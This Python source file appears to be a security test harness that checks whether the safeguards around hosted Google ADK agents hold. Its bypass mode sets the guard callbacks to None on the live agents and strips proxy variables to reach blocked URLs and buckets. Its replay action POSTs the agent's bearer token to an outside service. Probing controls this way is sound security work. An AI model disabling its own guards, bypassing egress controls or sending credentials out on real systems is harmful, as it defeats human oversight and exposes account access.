"""v3 agent (T45, T48; T48b, T50, T51, T52, T55 via probes.py): deterministic harness-boundary probe.

The query text is a command, e.g. `ACTION=b MODE=bypass VARIANT=direct`. A custom ADK BaseAgent parses it;
no LLM chooses a target. All targets come from env vars. HARNESS_GUARD=on is always active at boot: real ADK
before_model_callback / before_tool_callback are registered on the inner agents. Every action returns one JSON line.
Token material is never returned or logged (replay returns only sha256(token)[:12] and the expiry)."""

import hashlib
import json
import os
import re
import threading
import urllib.error
import urllib.request
from datetime import datetime, timezone
from typing import Any, AsyncGenerator
from urllib.parse import urlparse

import google.auth
import google.auth.transport.requests
import requests
from google.adk.agents import Agent, BaseAgent
from google.adk.events import Event
from google.adk.models import BaseLlm, LlmResponse
from google.genai import types
from vertexai.agent_engines import AdkApp

import probes

os.environ.setdefault("GOOGLE_GENAI_USE_VERTEXAI", "True")
os.environ["GOOGLE_CLOUD_LOCATION"] = os.environ.get("LZV_MODEL_LOCATION", "global")
if os.environ.get("LZV_PROJECT_ID"):
    os.environ.setdefault("GOOGLE_CLOUD_PROJECT", os.environ["LZV_PROJECT_ID"])

HARNESS_GUARD = "on"  # fixed: the guard is always on at boot; modes differ only in what the caller does
PROMPT = "Reply with the single word: ok"
TOKEN_RE = re.compile(r"(ya29\.[\w.\-]+|eyJ[\w.\-]{20,}|Bearer\s+[\w.\-]+)")

_R: dict = {}  # per-request scratch: filled by callbacks and tool bodies, reset in each request


def _env(name: str) -> str:
    return os.environ.get(name, "")


def _agent_name() -> str:
    return _env("LZV_AGENT_NAME")


def _short(text: Any) -> str:
    return TOKEN_RE.sub("[redacted]", str(text or "")).replace("\n", " ")[:300]


def _now() -> str:
    return datetime.now(timezone.utc).isoformat(timespec="seconds")


def _classify(exc: Exception) -> tuple:
    """(refused_by, status code, text) for a failed call. Status is read from API/HTTP errors when present."""
    code = getattr(exc, "code", None) or getattr(exc, "status_code", None)
    if code is None and getattr(exc, "response", None) is not None:
        code = getattr(exc.response, "status_code", None)
    if isinstance(code, int):
        return "http_status", code, f"{exc.__class__.__name__}: {exc}"
    return exc.__class__.__name__, None, f"{exc.__class__.__name__}: {exc}"


# --- guard policy (used by the real ADK callbacks) -------------------------------------------------------
def _approved() -> set:
    return {a.strip() for a in _env("LZV_APPROVED_AGENTS").split(",") if a.strip()}


def _allowed_host() -> str:
    return urlparse(_env("LZV_ALLOWED_URL")).hostname or ""


def before_model_guard(callback_context, llm_request):
    """ADK before_model_callback: refuse unless this agent name is approved."""
    if _agent_name() in _approved():
        return None
    _R.update(refused_by="adk_callback", status=None, error="before_model_callback: agent not in LZV_APPROVED_AGENTS")
    return LlmResponse(content=types.Content(role="model", parts=[types.Part(text="refused_by_harness")]))


def before_tool_guard(tool, args, tool_context):
    """ADK before_tool_callback: URL host allowlist and destination-bucket allowlist."""
    reason = None
    if tool.name == "fetch_url" and (urlparse(args.get("url", "")).hostname or "") != _allowed_host():
        reason = "before_tool_callback: URL host not in allowlist"
    elif tool.name == "copy_object" and args.get("dest_bucket") != _env("LZV_SRC_BUCKET"):
        reason = "before_tool_callback: destination bucket not in allowlist"
    if reason is None:
        return None
    _R.update(refused_by="adk_callback", status=None, error=reason)
    return {"refused": reason}


# --- underlying operations (shared by the tool bodies and the bypass path) --------------------------------
def _http_get(url: str, direct: bool = False) -> dict:
    # direct: a dedicated opener with no proxy (urlopen's global opener caches the proxy env on first use).
    opener = urllib.request.build_opener(urllib.request.ProxyHandler({})) if direct else None
    try:
        req = urllib.request.Request(url, method="GET")
        with (opener.open(req, timeout=10) if opener else urllib.request.urlopen(req, timeout=10)) as resp:  # noqa: S310
            return {"refused_by": None, "status": resp.status, "error": ""}
    except urllib.error.HTTPError as exc:  # 403 from SWP etc.
        return {"refused_by": "http_status", "status": exc.code, "error": _short(f"HTTPError: {exc.reason}")}
    except Exception as exc:  # noqa: BLE001 - every failure is the evidence
        r, s, t = _classify(exc)
        return {"refused_by": r, "status": s, "error": _short(t)}


def _http_get_deadline(url: str, seconds: float = 20.0) -> dict:
    """Direct (no proxy) _http_get with a hard deadline (urlopen's timeout does not cover DNS resolution; T45 run-1 hung 240 s)."""
    box: dict = {}
    t = threading.Thread(target=lambda: box.update(_http_get(url, direct=True)), daemon=True)
    t.start()
    t.join(seconds)
    if t.is_alive():
        return {"refused_by": "deadline", "status": None, "error": f"no answer within {seconds:.0f} s (DNS or connect)"}
    return box


def _copy_blob(src_bucket: str, src_object: str, dest_bucket: str, dest_object: str) -> dict:
    try:
        from google.cloud import storage

        client = storage.Client(project=_env("LZV_PROJECT_ID") or None)
        sb = client.bucket(src_bucket)
        sb.copy_blob(sb.blob(src_object), client.bucket(dest_bucket), dest_object)
        return {"refused_by": None, "status": 200, "error": ""}
    except Exception as exc:  # noqa: BLE001
        r, s, t = _classify(exc)
        return {"refused_by": r, "status": s, "error": _short(t)}


def _genai_call() -> dict:
    try:
        from google.genai import Client

        client = Client(vertexai=True, project=_env("LZV_PROJECT_ID") or None,
                        location=_env("LZV_MODEL_LOCATION") or "global")
        client.models.generate_content(model=_env("LZV_MODEL"), contents=PROMPT)
        return {"refused_by": None, "status": 200, "error": ""}
    except Exception as exc:  # noqa: BLE001
        r, s, t = _classify(exc)
        return {"refused_by": r, "status": s, "error": _short(t)}


# --- tools (the ADK pipeline calls these; arguments come from the scripted model, i.e. from env) -----------
def fetch_url(url: str) -> dict:
    """HTTP GET one URL (10 s timeout).

    Args:
        url: URL to fetch.

    Returns:
        dict with status and error.
    """
    _R.update(_http_get(url))
    return {"done": True}


def copy_object(src_bucket: str, src_object: str, dest_bucket: str, dest_object: str) -> dict:
    """Copy one Cloud Storage object.

    Args:
        src_bucket: source bucket.
        src_object: source object name.
        dest_bucket: destination bucket.
        dest_object: destination object name.

    Returns:
        dict with done flag.
    """
    _R.update(_copy_blob(src_bucket, src_object, dest_bucket, dest_object))
    return {"done": True}


class ScriptedLlm(BaseLlm):
    """Not a real model: emits one fixed function call (args taken from env by the dispatcher), then a final text.
    It exists only so the real ADK tool pipeline (including before_tool_callback) runs deterministically."""

    model: str = "lzv-scripted"

    async def generate_content_async(self, llm_request, stream: bool = False):
        # One call per command: the dispatcher sets scripted_call, the first model turn consumes it,
        # every later turn ends the run. (Checking the history for a function_response did not stop
        # the loop under ADK 2.13: offline test 2026-11-10 hit the 500-call limit.)
        call = _R.pop("scripted_call", None)
        if call is None:
            yield LlmResponse(content=types.Content(role="model", parts=[types.Part(text="done")]))
            return
        yield LlmResponse(content=types.Content(role="model", parts=[
            types.Part(function_call=types.FunctionCall(name=call["name"], args=call["args"]))]))


def _build_inner() -> tuple:
    model_agent = Agent(
        name="lzv_inner_model", model=_env("LZV_MODEL") or "gemini-2.0-flash",
        instruction="Reply with the single word: ok",
        before_model_callback=before_model_guard)
    tool_agent = Agent(
        name="lzv_inner_tools", model=ScriptedLlm(), instruction="unused",
        tools=[fetch_url, copy_object], before_tool_callback=before_tool_guard)
    return model_agent, tool_agent


def _parse(text: str) -> dict:
    kv = dict(re.findall(r"([A-Za-z_]+)=([^\s]+)", text or ""))
    return {k.upper(): v.lower() for k, v in kv.items()}


def _raw(text: str, key: str) -> str:
    """Case-preserving value of KEY=value (for base64url payloads; _parse lowercases)."""
    m = re.search(rf"(?:^|\s){key}=([^\s]+)", text or "")
    return m.group(1) if m else ""


def _scripted_call(action: str, cmd: dict) -> dict:
    if action == "b":
        key = {"allowed": "LZV_ALLOWED_URL", "internet": "LZV_INTERNET_URL"}.get(cmd.get("TARGET"), "LZV_DENIED_URL")
        return {"name": "fetch_url", "args": {"url": _env(key)}}
    dest = _env("LZV_SRC_BUCKET") if cmd.get("DEST") == "src" else _env("LZV_OUT_BUCKET")
    return {"name": "copy_object", "args": {
        "src_bucket": _env("LZV_SRC_BUCKET"), "src_object": _env("LZV_SRC_OBJECT"),
        "dest_bucket": dest, "dest_object": f"lzv-copy-{_agent_name()}-{datetime.now(timezone.utc).strftime('%Y%m%dT%H%M%S%f')}"[:200]}}


def _replay() -> dict:
    """T48: one Vertex call with own credentials, then POST the bearer token to LZV_REPLAY_URL. Token stays in memory."""
    url = _env("LZV_REPLAY_URL")
    out: dict = {"refused_by": None, "status": None, "error": ""}
    try:
        creds, _ = google.auth.default(scopes=["https://www.googleapis.com/auth/cloud-platform"])
        creds.refresh(google.auth.transport.requests.Request())
        token = creds.token
        loc, proj, model = _env("LZV_MODEL_LOCATION") or "global", _env("LZV_PROJECT_ID"), _env("LZV_MODEL")
        body = {"contents": [{"role": "user", "parts": [{"text": PROMPT}]}]}
        path = f"/v1/projects/{proj}/locations/{loc}/publishers/google/models/{model}:generateContent"
        mhost = "aiplatform.mtls.googleapis.com" if loc == "global" else f"{loc}-aiplatform.mtls.googleapis.com"
        phost = "aiplatform.googleapis.com" if loc == "global" else f"{loc}-aiplatform.googleapis.com"
        # Control 1: own call over the mTLS endpoint with the agent's client certificate (as the genai client does).
        # configure_mtls_channel() loads the default client cert (auto-enabled by the workload cert config).
        sess = google.auth.transport.requests.AuthorizedSession(creds)
        try:
            sess.configure_mtls_channel()
        except Exception as exc:  # noqa: BLE001
            out["own_mtls_error"] = _short(f"{exc.__class__.__name__}: {exc}")
        own = sess.post(f"https://{mhost}{path}", timeout=30, json=body)
        out["own_call_status"] = own.status_code
        out["own_call_mtls"] = sess.is_mtls
        out["own_token_same"] = creds.token == token
        # Observation: the same token from the agent itself, regular endpoint, no client certificate.
        nocert = requests.post(f"https://{phost}{path}", timeout=30, headers={"authorization": f"Bearer {token}"}, json=body)
        out["own_nocert_status"] = nocert.status_code
        out["token_sha12"] = hashlib.sha256(token.encode()).hexdigest()[:12]
        out["token_expiry"] = creds.expiry.replace(tzinfo=timezone.utc).isoformat() if creds.expiry else None
        # The replay service has invoker IAM disabled (Cloud Run does not verify agent identity ID tokens; run-1-r2).
        resp = requests.post(url.rstrip("/") + "/replay", timeout=60,
                             json={"token": token, "project": proj, "model": model, "location": loc})
        try:
            rj = resp.json()
        except ValueError:
            rj = {"raw": _short(resp.text)}
        rj.pop("token", None)
        out["replay_http_status"] = resp.status_code
        out["replay"] = {k: (_short(v) if isinstance(v, str) else v) for k, v in rj.items()}
        out["status"] = rj.get("status") if isinstance(rj, dict) else None
        if out["status"] != 200:
            out["refused_by"] = "http_status" if isinstance(out["status"], int) else "replay_service"
            out["error"] = _short(rj.get("error_message", ""))
    except Exception as exc:  # noqa: BLE001
        r, s, t = _classify(exc)
        out.update(refused_by=r, status=s, error=_short(t))
    return out


class HarnessProbe(BaseAgent):
    """Deterministic dispatcher. guarded: go through the inner agents (real ADK pipeline, callbacks fire).
    bypass: set the callbacks to None on the live inner agents, then call the client directly."""

    model_agent: Any = None
    tool_agent: Any = None

    async def _run_async_impl(self, ctx) -> AsyncGenerator[Event, None]:
        text = ""
        if ctx.user_content and ctx.user_content.parts:
            text = " ".join(p.text or "" for p in ctx.user_content.parts)
        cmd = _parse(text)
        action, mode = cmd.get("ACTION", ""), cmd.get("MODE", "guarded")
        variant = cmd.get("VARIANT", "")
        _R.clear()
        res: dict = {"refused_by": "bad_command", "status": None, "error": _short(f"unparsed: {text}")}
        if action in ("model", "a", "b", "c") and mode in ("guarded", "bypass"):
            if mode == "guarded":
                inner = self.model_agent if action in ("model", "a") else self.tool_agent
                if inner is self.tool_agent:
                    _R["scripted_call"] = _scripted_call(action, cmd)
                try:
                    async for _ in inner.run_async(ctx):
                        pass
                except Exception as exc:  # noqa: BLE001
                    r, s, t = _classify(exc)
                    _R.update(refused_by=r, status=s, error=_short(t))
                if "status" not in _R:  # model path: callback not triggered means the call went through
                    _R.update(refused_by=None, status=200, error="")
                res = {k: _R.get(k) for k in ("refused_by", "status", "error")}
            else:
                # In-process compromise: unhook the callbacks on the live agents (HARNESS_GUARD stays "on").
                self.model_agent.before_model_callback = None
                self.tool_agent.before_tool_callback = None
                if action in ("model", "a"):
                    res = _genai_call()
                elif action == "b":
                    key = {"allowed": "LZV_ALLOWED_URL", "internet": "LZV_INTERNET_URL"}.get(cmd.get("TARGET"), "LZV_DENIED_URL")
                    saved = {k: os.environ.pop(k) for k in ("HTTPS_PROXY", "https_proxy") if k in os.environ} \
                        if variant == "direct" else {}
                    try:
                        res = _http_get_deadline(_env(key)) if variant == "direct" else _http_get(_env(key))
                    finally:
                        os.environ.update(saved)
                else:
                    c = _scripted_call("c", cmd)["args"]
                    res = _copy_blob(c["src_bucket"], c["src_object"], c["dest_bucket"], c["dest_object"])
                # re-arm so a later guarded request in the same instance is unaffected
                self.model_agent.before_model_callback = before_model_guard
                self.tool_agent.before_tool_callback = before_tool_guard
        elif action == "replay":
            res = _replay()
        elif action in ("relay_put", "relay_take", "boundary", "routes", "sessions", "exfil"):
            try:
                if action == "relay_put":
                    probe = probes.relay_put(cmd.get("NONCE", ""))
                elif action == "relay_take":
                    probe = probes.relay_take(cmd.get("NONCE", ""))
                elif action == "boundary":
                    probe = probes.boundary(cmd.get("STEP", ""), _raw(text, "PROJECT"), _raw(text, "FOLDER"), _raw(text, "ENGINE"),
                                            _raw(text, "DISPLAY"), cmd.get("NONCE", ""))
                elif action == "routes":
                    probe = probes.routes(_raw(text, "REGION") or "europe-west1", _env("LZV_SRC_BUCKET"))
                elif action == "sessions":
                    probe = probes.sessions(_raw(text, "ENGINE"), _raw(text, "SESSION"), _raw(text, "USER"))
                else:
                    probe = probes.exfil()
                res = {"refused_by": None, "status": 200, "error": "", "probe": probe}
            except Exception as exc:  # noqa: BLE001
                r, s, t = _classify(exc)
                res = {"refused_by": r, "status": s, "error": _short(t)}
        elif action == "ping":
            # Readiness probe for the orchestrator (tests/run-v3h.sh): no network call, no model call.
            res = {"refused_by": None, "status": 200, "error": ""}
        line = {"action": action, "mode": mode, "variant": variant, "harness_guard": HARNESS_GUARD,
                "refused_by": res.get("refused_by"), "status": res.get("status"),
                "error": _short(res.get("error")), "timestamp": _now(), "agent_name": _agent_name()}
        if "probe" in res:
            line["probe"] = res["probe"]
        if action == "replay":
            line.update({k: res[k] for k in ("own_call_status", "own_call_mtls", "own_mtls_error", "own_token_same", "own_nocert_status", "token_sha12", "token_expiry", "replay",
                                              "replay_http_status") if k in res})
        yield Event(author=self.name, invocation_id=ctx.invocation_id,
                    content=types.Content(role="model", parts=[types.Part(text=json.dumps(line))]))


_model_agent, _tool_agent = _build_inner()
root_agent = HarnessProbe(name="lzv_probe_v3", model_agent=_model_agent, tool_agent=_tool_agent,
                          sub_agents=[_model_agent, _tool_agent])

app = AdkApp(agent=root_agent)
